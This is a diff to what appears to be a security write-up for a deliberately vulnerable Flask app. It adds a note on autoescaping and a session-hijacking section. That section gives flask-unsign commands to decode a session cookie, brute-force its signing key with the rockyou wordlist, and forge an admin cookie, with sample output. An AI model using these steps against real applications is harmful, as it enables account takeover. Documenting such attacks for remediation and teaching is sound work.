@@ -66,5 +66,49 @@ Deep diving into our application code we see the 2 main causes of this vulnerabi
   - Construct **Regular expressions** to validate user input.
 
 * **Output Encoding for “HTML Contexts”.**  Output Encoding is recommended when we need to safely display data exactly as a user typed it in.
-Hence in order to add a variable to a HTML context safely, HTML entity encoding should be used for that variable as we add it to a web template. Flask has default encoding capability, hence to fix the vulnerability in our code we should remove the `|safe` tag while adding it to web template.
+Hence in order to add a variable to a HTML context safely, HTML entity encoding should be used for that variable as we add it to a web template. Flask has default encoding capability ([Reference Link](https://flask.palletsprojects.com/en/1.1.x/templating/#controlling-autoescaping)), hence to fix the vulnerability in our code we should remove the `|safe` tag while adding it to web template.
 
+### 3. Session Hijacking:
+#### Attack Details:
+The disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in the web application. Our application is vulnerable to **session hijacking** which can be explioted by using tools like **flask-unsign**. Flask-unsign ([Download Link](https://pypi.org/project/flask-unsign/)) is a command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. Below are the steps on how to exploit the session vulnerability in our flask application:
+
+* **Step 1:**
+  - Decode session cookie using flask-unsign.
+  ```
+  flask-unsign --decode --cookie 'eyJpZCI6MSwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y6-xzg.NeUwSfTaH1n2gWd5qhqSsNv-7Tk'
+  ```
+  - Output: decoded cookie value.
+  ```
+  {'id': 1, 'loggedin': True, 'username': 'test'}
+  ```
+
+* **Step 2:**
+  - Use wordlist ([Download Link](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjstLrx8af8AhX8-DgGHQJyA0UQFnoECBMQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)) of common passwords to bruteforce the secret key.
+   ```
+   flask-unsign --wordlist rockyou.txt --unsign --cookie 'eyJpZCI6MSwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y6-xzg.NeUwSfTaH1n2gWd5qhqSsNv-7Tk'  --no-literal-eval
+   ```
+  - Output: API key **`s3cr3t`** obtained via brute-force.
+  ```
+  [*] Session decodes to: {'id': 1, 'loggedin': True, 'username': 'test'}
+  [*] Starting brute-forcer with 8 threads..
+  [+] Found secret key after 70144 attempts
+  b's3cr3t'
+  ```
+
+* **Step 3:**
+  - Craft a session cookie using the secret obtained in Step 2.
+  ```
+   flask-unsign --sign --cookie "{'id': 2, 'loggedin': True, 'username': 'admin'}" --secret 's3cr3t'
+  ```
+
+  - Output: temporary cookie for username **`admin`**.
+  ```
+   eyJpZCI6MiwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Y6-0ng.j6FmpIcxhSd8_6URCDmy03sFnX8
+  ```
+
+* **Step 4:**
+  - Login to test account and use this admin cookie to make request from browser.
+  - Will be logged in as admin.
+  
+#### Remediation Steps:
+* Make sure to use strong API key using CPRG.
